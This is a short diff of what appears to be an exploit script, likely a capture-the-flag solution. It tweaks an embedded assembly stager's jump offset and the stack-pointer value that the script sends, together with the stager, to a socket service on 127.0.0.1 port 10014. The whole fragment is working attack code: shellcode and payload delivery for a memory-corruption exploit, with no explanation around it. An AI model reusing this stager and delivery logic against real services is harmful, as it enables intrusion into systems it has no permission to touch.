@@ -8,9 +8,8 @@ _start:
     R3 += 1
     W[SP] = R3
 # 00001400 <_start>:
-    P0 = 0x1400 - 4
     # relative
-    JUMP 0x1400 - (0x1aec + 16)
+    JUMP 0x1400 - (0x1aec + 12)
 .ascii "%s"
 '''
 asm = '''.section .text
@@ -85,7 +84,7 @@ IP = '127.0.0.1'
 PORT = 10014
 s = mysock(IP, PORT)
 
-SP = 0x1b00 - BUF_SIZE - 4
+SP = 0x1aec
 sl(s, '\n000')
 first = stager + p(SP)[0:2] + '\n'
 sl(s, first)
